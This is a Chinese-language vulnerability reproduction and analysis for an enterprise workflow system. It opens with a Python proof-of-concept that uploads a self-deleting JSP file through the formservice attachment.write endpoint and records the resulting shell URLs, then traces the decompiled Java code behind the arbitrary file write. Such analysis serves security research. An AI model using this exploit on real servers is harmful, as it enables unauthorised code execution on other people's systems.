# 漏洞复现

```
# body="企业流程化管控系统" && body="密码(Password):"

import re
import requests
import urllib3
import multiprocessing

urllib3.disable_warnings()

proxies = {
    "http": "http://127.0.0.1:7890",
    "https": "http://127.0.0.1:7890"
}

data = '''<% out.println("CdaF3C8f77065666");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>'''


def poc(url):
    target = url + "/formservice?service=attachment.write&isattach=false&filename=acebe1BA7BC18dB4.jsp"
    try:
        r = requests.post(target, data=data, verify=False, proxies=proxies, allow_redirects=False)
        print(r.text)
        pattern = r'<root>(.*?)</root>'
        match = re.search(pattern, r.text)
        if match:
            filename = match.group(1)
            shell = url + f"/form/temp/{filename}"
            if requests.get(shell).status_code == 200:
                with open("result.txt", "a") as f:
                    f.write(shell + "\n")
                    f.close()
                print("shell地址：" + shell)
            else:
                pass
    except:
        pass


if __name__ == "__main__":
    poc("http://127.0.0.1:8081")
```

![image-20230820175259879](images/1.png)

![image-20230820175305253](images/2.png)

访问后删除

# 漏洞分析

定位到路由FormService

![image-20230821190925810](images/3.png)

这个方法首先会从Request对象中取出service参数赋值给var6，取出第一个值，然后根据这个值对相应类进行实例化，service可以通过Class.Method这种形式来指定调用对应service的对应方法，例如attachment.write

getservice方法通过var1也即是service传入的值从HashMap中获取一个Object，这个Object包含了class消息，对应的将要调用的方法，方法的长度，类名，方法名等信息，返回后通过var2[0].newInstance对相应类进行实例化

![image-20230821192130472](images/4.png)

然后对变量进行赋值

![image-20230821193427977](images/5.png)

这里因为是反编译的代码，调试过程看到的变量感觉有点问题，其实var8才是那个对应的attachment类，var9时长度，var10是attachment字符串，var11是write字符串，var12时attachment类实现的所有接口

![image-20230821193613324](images/6.png)

也就是IScurityService接口，遍历获取接口，当实现了IScurityService接口的时候可以进入if方法，通过反射调用attachment的isAccessible方法判断write方法能否被访问

![image-20230821193928656](images/7.png)

只要不为空，并且不包含delete子串即可，接下来当在207行中如果获取到了isAccessible方法，不为空则跳出循环

![image-20230821194609224](images/8.png)

接下来判断请求到方法是否为GET，并且调用的方法长度是否为0 ，着var9不是attachment，而是write的长度5，当为POST的时候进入else分支

![image-20230821195329464](images/9.png)

没有传入content，也不是文件上传的请求的话，就进入else，var49的定义在service最开头

![image-20230821195356678](images/10.png)

没有传入inflate的时候为flase，在else if中的判断也不满足，因为write的长度为5

在后面通过长度判断进入到对应的if

![image-20230821195536346](images/11.png)

获取POST的原始数据流赋值给var60，后面还会判断是否实现了AbstractArteryService也会有一系列流程

![image-20230821223122858](images/12.png)

当不满足的话，就会进入else分支，因为var9代表调用方法的长度不为0 ，所以创建一个Object类，里面是request，response对象，以及POST获取到的原始数据流

![image-20230821223420966](images/13.png)

然后通过反射，调用对应的Method，因为传入的service是attachment.write，所以这里是调用的attachment的write方法，传入了过程构造的Object对象

![image-20230821223801476](images/14.png)

这个方法首先获取了两个参数，filename和isattach，isattach默认为true，可以自己控制进入不同的分支，在else分支中

![image-20230821224006721](images/15.png)

存在文件写入的相关操作，获取了rootpath，因为isattach此时为false，所以rootpath其实是在/form目录，接下来通过一系列拼接操作生成新的attachFilename，然后将文件写入/form/temp，内容是传入的is这个InputStream，即POST的原始数据流

![image-20230821224548149](images/16.png)

然后返回写入的文件名，然后在service方法的最后会通过response对象输出一个xml信息到页面上

![image-20230821224926474](images/17.png)

输出类似如下信息

![image-20230821225237944](images/18.png)